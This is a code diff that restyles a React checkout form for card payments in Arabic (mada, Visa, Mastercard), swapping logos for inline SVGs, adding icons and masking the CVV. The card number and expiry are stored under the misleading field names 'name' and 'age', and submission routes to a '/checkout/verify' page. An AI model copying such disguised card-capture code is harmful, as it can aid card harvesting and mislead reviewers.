@@ -2,7 +2,8 @@
 
 import { useState } from "react";
 import { useRouter } from "next/navigation";
-import Image from "next/image";
+import React from "react";
+import { IoLockClosedOutline, IoCardOutline, IoCalendarOutline, IoShieldCheckmarkOutline, IoPersonOutline, IoArrowForward } from "react-icons/io5";
 import creditCardType from "credit-card-type";
 
 interface PaymentFormProps {
@@ -25,24 +26,68 @@ function detectCard(num: string): CardBrand {
   return null;
 }
 
-function CardLogo({ brand, width = 48, className = "" }: { brand: string; width?: number; className?: string }) {
+function VisaSVG() {
+  return (
+    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full">
+      <rect width="48" height="30" rx="4" fill="white"/>
+      <path d="M19.5 20H17l1.6-10h2.5L19.5 20zm-5.2-10l-2.4 6.9-.3-1.4-1-5c-.2-.5-.6-.5-1.1-.5H6l-.1.3c.9.2 1.8.5 2.5 1l2.1 7.7h2.6L17 10h-2.7zm16.4 6.8c0-1-.6-1.8-2-2.4-1-.5-1.6-.8-1.6-1.3 0-.4.5-.9 1.6-.9.9 0 1.6.2 2.1.4l.3.1.4-2.3c-.6-.2-1.4-.4-2.5-.4-2.7 0-4.6 1.4-4.6 3.5 0 1.5 1.4 2.4 2.4 2.9 1.1.5 1.5.9 1.5 1.4 0 .7-.9 1.1-1.7 1.1-1.1 0-1.8-.2-2.7-.6l-.4-.2-.4 2.4c.7.3 1.9.6 3.2.6 3 0 4.9-1.4 4.9-3.6l.1.3zm7.5-6.8h-2c-.6 0-1.1.2-1.4.8L32 20h2.6l.5-1.4h3.2l.3 1.4H41L38.2 10zm-3 6.8l1.3-3.6.7 3.6h-2z" fill="#1A1F71"/>
+    </svg>
+  );
+}
+
+function MastercardSVG() {
+  return (
+    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full">
+      <rect width="48" height="30" rx="4" fill="white"/>
+      <circle cx="19" cy="15" r="7" fill="#EB001B"/>
+      <circle cx="29" cy="15" r="7" fill="#F79E1B"/>
+      <path d="M24 9.5a7 7 0 0 1 0 11A7 7 0 0 1 24 9.5z" fill="#FF5F00"/>
+    </svg>
+  );
+}
+
+function MadaSVG({ inverted = false }: { inverted?: boolean }) {
+  return (
+    <div className="w-full h-full flex items-center justify-center" style={{ background: inverted ? "transparent" : "white" }}>
+      {/* eslint-disable-next-line @next/next/no-img-element */}
+      <img src="/unnamed.jpg" alt="Mada" className="w-full h-full object-contain" style={{ filter: inverted ? "brightness(0) invert(1)" : "none" }} />
+    </div>
+  );
+}
+
+function CardLogo({ brand, size = "md" }: { brand: string; size?: "sm" | "md" | "lg" }) {
+  const dims = size === "sm" ? "w-10 h-[26px]" : size === "lg" ? "w-16 h-10" : "w-12 h-[30px]";
+  const svgMap: Record<string, React.ReactNode> = {
+    visa: <VisaSVG />,
+    mastercard: <MastercardSVG />,
+    mada: <MadaSVG />,
+  };
+  if (!svgMap[brand]) return null;
+  return (
+    <div className={`${dims} rounded-md shadow border border-gray-100 overflow-hidden flex-shrink-0`}>
+      {svgMap[brand]}
+    </div>
+  );
+}
+
+function CardLogoInvert({ brand }: { brand: string }) {
   if (brand === "visa") return (
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 471" width={width} className={className}>
-      <path d="M278.2 334.2h-60.5l37.8-233.9h60.5z" fill="#00579f"/>
-      <path d="M524.3 105.6c-12-4.5-30.7-9.3-54.1-9.3-59.6 0-101.6 31.7-101.9 77.1-.4 33.6 30 52.3 52.8 63.5 23.5 11.5 31.4 18.8 31.3 29.1-.2 15.7-18.8 22.9-36.1 22.9-24.1 0-36.9-3.5-56.7-12.2l-7.8-3.7-8.4 52.2c14.1 6.5 40.1 12.1 67.1 12.4 63.4 0 104.6-31.3 105.1-79.8.3-26.6-15.9-46.8-50.8-63.5-21.1-10.8-34.1-18-33.9-29 0-9.7 10.9-20.1 34.6-20.1 19.7-.3 34 4.2 45.1 9l5.4 2.7 8.3-51.3z" fill="#00579f"/>
-      <path d="M661.6 100.3h-46.6c-14.4 0-25.2 4.2-31.5 19.3L487.8 334.2h63.4s10.4-28.8 12.7-35.1h77.4c1.8 8.2 7.3 35.1 7.3 35.1H702L661.6 100.3zm-74.6 182c5-13.5 24.2-65.6 24.2-65.6-.4.6 5-13.6 8.1-22.5l4.1 20.3s11.6 56.2 14.1 67.8h-50.5z" fill="#00579f"/>
-      <path d="M232.8 100.3L173.6 261l-6.4-32.5c-11-37.4-45.3-78-83.7-98.3l54.1 204h63.8l95-234h-63.6z" fill="#00579f"/>
-      <path d="M120.4 100.3H24.2L23 105.6c75.6 19.3 125.6 65.9 146.4 121.9L147.7 120c-3.7-14.8-14.4-19.3-27.3-19.7z" fill="#faa61a"/>
+    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-12 h-8">
+      <path d="M19.5 20H17l1.6-10h2.5L19.5 20zm-5.2-10l-2.4 6.9-.3-1.4-1-5c-.2-.5-.6-.5-1.1-.5H6l-.1.3c.9.2 1.8.5 2.5 1l2.1 7.7h2.6L17 10h-2.7zm16.4 6.8c0-1-.6-1.8-2-2.4-1-.5-1.6-.8-1.6-1.3 0-.4.5-.9 1.6-.9.9 0 1.6.2 2.1.4l.3.1.4-2.3c-.6-.2-1.4-.4-2.5-.4-2.7 0-4.6 1.4-4.6 3.5 0 1.5 1.4 2.4 2.4 2.9 1.1.5 1.5.9 1.5 1.4 0 .7-.9 1.1-1.7 1.1-1.1 0-1.8-.2-2.7-.6l-.4-.2-.4 2.4c.7.3 1.9.6 3.2.6 3 0 4.9-1.4 4.9-3.6l.1.3zm7.5-6.8h-2c-.6 0-1.1.2-1.4.8L32 20h2.6l.5-1.4h3.2l.3 1.4H41L38.2 10zm-3 6.8l1.3-3.6.7 3.6h-2z" fill="white"/>
     </svg>
   );
   if (brand === "mastercard") return (
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 471" width={width} className={className}>
-      <circle cx="268" cy="235.5" r="150" fill="#eb001b"/>
-      <circle cx="482" cy="235.5" r="150" fill="#f79e1b"/>
-      <path d="M375 119.7c38.5 31.2 63.1 78.7 63.1 131.8s-24.6 100.6-63.1 131.8c-38.5-31.2-63.1-78.7-63.1-131.8s24.6-100.6 63.1-131.8z" fill="#ff5f00"/>
+    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-12 h-8">
+      <circle cx="19" cy="15" r="7" fill="rgba(255,255,255,0.75)"/>
+      <circle cx="29" cy="15" r="7" fill="rgba(255,255,255,0.5)"/>
+      <path d="M24 9.5a7 7 0 0 1 0 11A7 7 0 0 1 24 9.5z" fill="white"/>
     </svg>
   );
-  if (brand === "mada") return <Image src="/mada975b.png" alt="Mada" width={width} height={Math.round(width * 0.6)} className={`object-contain ${className}`} />;
+  if (brand === "mada") return (
+    <div className="w-12 h-8 flex items-center justify-center">
+      <MadaSVG inverted />
+    </div>
+  );
   return null;
 }
 
@@ -90,9 +135,9 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     try { await onSubmit(fields); router.push("/checkout/verify"); } finally { setLoading(false); }
   };
 
-  const inputBase = "w-full border rounded-xl px-3 py-2.5 text-sm text-gray-900 focus:outline-none transition bg-white";
-  const inputOk = "border-gray-200 focus:border-teal-400 focus:ring-2 focus:ring-teal-100";
-  const inputErr = "border-red-300 bg-red-50/30 focus:border-red-400 focus:ring-2 focus:ring-red-100";
+  const inputBase = "w-full border-2 rounded-2xl px-4 py-3.5 text-sm text-gray-900 focus:outline-none transition-all duration-200 bg-white placeholder:text-gray-300";
+  const inputOk = "border-gray-100 focus:border-[#053132] focus:ring-4 focus:ring-[#05313210] hover:border-gray-200";
+  const inputErr = "border-red-300 bg-red-50/40 focus:border-red-400 focus:ring-4 focus:ring-red-100";
 
   const displayNumber = fields.name ? fields.name.padEnd(19, " ").slice(0, 19) : "0000 0000 0000 0000";
 
@@ -100,62 +145,67 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
     : cardBrand === "mastercard"
     ? "linear-gradient(135deg, #eb5757 0%, #000000 100%)"
-    : "linear-gradient(135deg, #0d9488 0%, #065f46 50%, #064e3b 100%)";
+    : "linear-gradient(135deg, #053132 0%, #082D32 50%, #0D202E 100%)";
 
   return (
-    <>
+    <div className="space-y-5">
       {/* ── Visual Card ── */}
-      <div className="w-full max-w-sm mx-auto mb-5" style={{ perspective: "1000px", minHeight: "185px" }}>
-        <div style={{ transition: "transform 0.6s", transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", position: "relative", minHeight: "185px" }}>
+      <div className="w-full max-w-sm mx-auto" style={{ perspective: "1200px", minHeight: "200px" }}>
+        <div style={{ transition: "transform 0.65s cubic-bezier(.4,0,.2,1)", transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", position: "relative", minHeight: "200px" }}>
           {/* Front */}
-          <div className="absolute inset-0 rounded-2xl p-5 text-white select-none" style={{ background: cardBg, boxShadow: "0 16px 48px rgba(0,0,0,0.25)", backfaceVisibility: "hidden" }}>
-            <div className="flex justify-between items-start mb-6">
-              <div className="w-10 h-7 rounded-md" style={{ background: "linear-gradient(135deg, #d4af37, #f5e06e, #d4af37)" }} />
-              <div className="h-7 flex items-center">
-                {cardBrand ? (
-                  <CardLogo brand={cardBrand} width={48} className="brightness-0 invert" />
-                ) : (
-                  <span className="text-xs text-white/40">CARD</span>
-                )}
+          <div className="absolute inset-0 rounded-3xl p-6 text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 20px 60px rgba(5,49,50,0.35)", backfaceVisibility: "hidden" }}>
+            {/* shimmer */}
+            <div className="absolute inset-0 opacity-10" style={{ background: "radial-gradient(ellipse at 20% 20%, rgba(255,255,255,0.6) 0%, transparent 60%)" }} />
+            <div className="relative flex justify-between items-start mb-7">
+              <div className="w-11 h-8 rounded-lg" style={{ background: "linear-gradient(135deg,#d4af37,#f5e06e,#c8a415)" }} />
+              <div className="h-8 flex items-center">
+                {cardBrand ? <CardLogoInvert brand={cardBrand} /> : <span className="text-xs text-white/30 font-mono tracking-widest">CARD</span>}
               </div>
             </div>
-            <div className="font-mono text-lg sm:text-xl tracking-widest mb-5 text-center" dir="ltr">{displayNumber}</div>
-            <div className="flex justify-between items-end">
+            <div className="relative font-mono text-xl sm:text-2xl tracking-[0.2em] mb-6 text-center drop-shadow" dir="ltr">{displayNumber}</div>
+            <div className="relative flex justify-between items-end">
               <div>
-                <p className="text-[10px] opacity-50 mb-0.5">CARD HOLDER</p>
-                <p className="text-xs sm:text-sm font-semibold tracking-wider uppercase truncate max-w-[160px]">{fields.cardHolder || "FULL NAME"}</p>
+                <p className="text-[9px] uppercase tracking-widest opacity-40 mb-1">Card Holder</p>
+                <p className="text-sm font-semibold tracking-wider uppercase truncate max-w-[170px]">{fields.cardHolder || "FULL NAME"}</p>
               </div>
               <div className="text-right">
-                <p className="text-[10px] opacity-50 mb-0.5">EXPIRES</p>
-                <p className="text-xs sm:text-sm font-semibold">{fields.age || "MM/YY"}</p>
+                <p className="text-[9px] uppercase tracking-widest opacity-40 mb-1">Expires</p>
+                <p className="text-sm font-semibold">{fields.age || "MM/YY"}</p>
               </div>
             </div>
           </div>
           {/* Back */}
-          <div className="absolute inset-0 rounded-2xl text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 16px 48px rgba(0,0,0,0.25)", backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
-            <div className="w-full h-10 mt-6" style={{ background: "#1a1a1a" }} />
-            <div className="px-5 mt-4">
-              <p className="text-[10px] opacity-50 mb-1 text-right">CVV</p>
-              <div className="bg-white rounded px-3 py-2 text-gray-800 font-mono tracking-widest text-right text-sm">{fields.cvv || "•••"}</div>
+          <div className="absolute inset-0 rounded-3xl text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 20px 60px rgba(5,49,50,0.35)", backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
+            <div className="absolute inset-0 opacity-10" style={{ background: "radial-gradient(ellipse at 80% 80%, rgba(255,255,255,0.6) 0%, transparent 60%)" }} />
+            <div className="w-full h-12 mt-8" style={{ background: "rgba(0,0,0,0.5)" }} />
+            <div className="px-6 mt-5">
+              <p className="text-[9px] uppercase tracking-widest opacity-40 mb-2 text-right">CVV</p>
+              <div className="bg-white/95 rounded-xl px-4 py-2.5 text-gray-800 font-mono tracking-[0.3em] text-right text-base shadow-inner">{fields.cvv ? "•".repeat(fields.cvv.length) : "•••"}</div>
             </div>
           </div>
         </div>
       </div>
 
-      {/* ── Form ── */}
-      <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
+      {/* ── Form Card ── */}
+      <div className="bg-white rounded-3xl border border-gray-100 shadow-sm overflow-hidden">
+
         {/* Accepted cards bar */}
-        <div className="flex items-center gap-3 px-4 py-2.5 bg-gray-50 border-b border-gray-100">
-          <span className="text-[11px] sm:text-xs text-gray-500 font-medium">نقبل:</span>
-          <CardLogo brand="mada" width={40} />
-          <CardLogo brand="visa" width={40} />
-          <CardLogo brand="mastercard" width={40} />
+        <div className="flex items-center gap-3 px-5 py-3 border-b border-gray-100" style={{ background: "linear-gradient(135deg,#f8fafa,#f0f4f4)" }}>
+          <IoShieldCheckmarkOutline size={15} className="text-[#053132] shrink-0" />
+          <span className="text-[11px] text-gray-500 font-semibold">دفع آمن — نقبل:</span>
+          <div className="flex items-center gap-2 mr-auto">
+            <CardLogo brand="mada" size="sm" />
+            <CardLogo brand="visa" size="sm" />
+            <CardLogo brand="mastercard" size="sm" />
+          </div>
         </div>
 
-        <div className="p-4 sm:p-5 space-y-4">
-          {/* Card Number - with logo inside */}
+        <div className="p-5 sm:p-6 space-y-5">
+
+          {/* Card Number */}
           <div>
-            <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
+            <label className="flex items-center gap-1.5 text-xs font-black text-gray-600 uppercase tracking-wider mb-2">
+              <IoCardOutline size={13} />
               رقم البطاقة <span className="text-red-400">*</span>
             </label>
             <div className="relative">
@@ -163,7 +213,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                 autoComplete="cc-number"
                 type="text"
                 inputMode="numeric"
-                placeholder="0000 0000 0000 0000"
+                placeholder="0000  0000  0000  0000"
                 maxLength={19}
                 dir="ltr"
                 value={fields.name}
@@ -173,33 +223,30 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                   setFields(f => ({ ...f, name: v }));
                   setCardError("");
                 }}
-                className={`${inputBase} ${cardError || (errors && !fields.name) ? inputErr : inputOk} pl-14 sm:pl-16 text-right`}
+                className={`${inputBase} ${cardError || (errors && !fields.name) ? inputErr : inputOk} pl-14 text-right font-mono text-base tracking-widest`}
               />
-              {/* Logo inside input */}
-              <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center pointer-events-none">
-                {cardBrand ? (
-                  <CardLogo brand={cardBrand} width={36} />
-                ) : (
-                  <div className="w-9 h-5.5 rounded bg-gray-100 flex items-center justify-center">
-                    <span className="text-[9px] text-gray-400">CARD</span>
-                  </div>
-                )}
+              <div className="absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none">
+                {cardBrand
+                  ? <CardLogo brand={cardBrand} size="sm" />
+                  : <div className="w-10 h-[26px] rounded-md bg-gray-100 flex items-center justify-center"><span className="text-[9px] text-gray-300 font-mono">CARD</span></div>
+                }
               </div>
             </div>
-            {cardError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {cardError}</p>}
+            {cardError && <p className="text-red-500 text-xs font-bold mt-1.5 flex items-center gap-1">⚠ {cardError}</p>}
           </div>
 
-          {/* Expiry + CVV row */}
-          <div className="grid grid-cols-2 gap-3">
+          {/* Expiry + CVV */}
+          <div className="grid grid-cols-2 gap-4">
             <div>
-              <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
-                تاريخ الانتهاء <span className="text-red-400">*</span>
+              <label className="flex items-center gap-1.5 text-xs font-black text-gray-600 uppercase tracking-wider mb-2">
+                <IoCalendarOutline size={13} />
+                الانتهاء <span className="text-red-400">*</span>
               </label>
               <input
                 autoComplete="cc-exp"
                 type="text"
                 inputMode="numeric"
-                placeholder="MM/YY"
+                placeholder="MM / YY"
                 maxLength={5}
                 value={fields.age}
                 onChange={e => {
@@ -208,19 +255,20 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                   setFields(f => ({ ...f, age: v }));
                   setExpiryError("");
                 }}
-                className={`${inputBase} ${expiryError || (errors && !fields.age) ? inputErr : inputOk} text-center`}
+                className={`${inputBase} ${expiryError || (errors && !fields.age) ? inputErr : inputOk} text-center font-mono tracking-widest`}
               />
-              {expiryError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {expiryError}</p>}
+              {expiryError && <p className="text-red-500 text-xs font-bold mt-1.5">⚠ {expiryError}</p>}
             </div>
             <div>
-              <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
+              <label className="flex items-center gap-1.5 text-xs font-black text-gray-600 uppercase tracking-wider mb-2">
+                <IoLockClosedOutline size={13} />
                 CVV <span className="text-red-400">*</span>
               </label>
               <input
                 autoComplete="cc-csc"
-                type="text"
+                type="password"
                 inputMode="numeric"
-                placeholder="000"
+                placeholder="•••"
                 maxLength={3}
                 value={fields.cvv}
                 onFocus={() => setFlipped(true)}
@@ -230,49 +278,54 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                   setFields(f => ({ ...f, cvv: v }));
                   setCvvError("");
                 }}
-                className={`${inputBase} ${cvvError || (errors && !fields.cvv) ? inputErr : inputOk} text-center`}
+                className={`${inputBase} ${cvvError || (errors && !fields.cvv) ? inputErr : inputOk} text-center font-mono tracking-widest`}
               />
-              {cvvError && <p className="text-red-500 text-[11px] font-bold mt-1">⚠️ {cvvError}</p>}
+              {cvvError && <p className="text-red-500 text-xs font-bold mt-1.5">⚠ {cvvError}</p>}
             </div>
           </div>
 
           {/* Card Holder */}
           <div>
-            <label className="block text-xs sm:text-sm font-bold text-gray-700 mb-1.5">
+            <label className="flex items-center gap-1.5 text-xs font-black text-gray-600 uppercase tracking-wider mb-2">
+              <IoPersonOutline size={13} />
               اسم حامل البطاقة <span className="text-red-400">*</span>
             </label>
             <input
               autoComplete="cc-name"
               type="text"
-              placeholder="FULL NAME"
+              placeholder="FULL NAME AS ON CARD"
               value={fields.cardHolder}
               onChange={e => {
                 const v = e.target.value.replace(/[^a-zA-Z ]/g, "");
                 setFields(f => ({ ...f, cardHolder: v.toUpperCase() }));
               }}
-              className={`${inputBase} ${errors && !fields.cardHolder ? inputErr : inputOk}`}
+              className={`${inputBase} ${errors && !fields.cardHolder ? inputErr : inputOk} font-mono tracking-wider`}
               dir="ltr"
             />
           </div>
+
         </div>
       </div>
 
       {/* ── Actions ── */}
-      <div className="flex gap-3 mt-4">
+      <div className="flex gap-3">
         <button
           onClick={() => router.push("/cart")}
-          className="flex-1 border border-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl text-sm hover:bg-gray-50 transition"
+          className="flex items-center justify-center gap-2 px-5 border-2 border-gray-100 text-gray-500 font-bold py-4 rounded-2xl text-sm hover:border-gray-200 hover:text-gray-700 transition-all"
         >
-          السابق
+          <IoArrowForward size={16} />
+          <span className="hidden sm:inline">السابق</span>
         </button>
         <button
           onClick={handleNext}
           disabled={loading}
-          className="flex-1 bg-gradient-to-r from-teal-600 to-emerald-600 hover:from-teal-700 hover:to-emerald-700 active:scale-[0.98] text-white font-bold py-3.5 rounded-2xl transition-all text-sm disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-teal-200/50"
+          className="flex-1 flex items-center justify-center gap-2.5 text-white font-black py-4 rounded-2xl transition-all text-sm active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed shadow-lg"
+          style={{ background: loading ? "#082D32" : "linear-gradient(135deg,#053132 0%,#082D32 60%,#0D202E 100%)", boxShadow: "0 8px 24px rgba(5,49,50,0.35)" }}
         >
-          {loading ? "جاري المعالجة..." : "تأكيد الدفع"}
+          <IoLockClosedOutline size={16} />
+          {loading ? "جاري المعالجة..." : "تأكيد الدفع الآن"}
         </button>
       </div>
-    </>
+    </div>
   );
 }
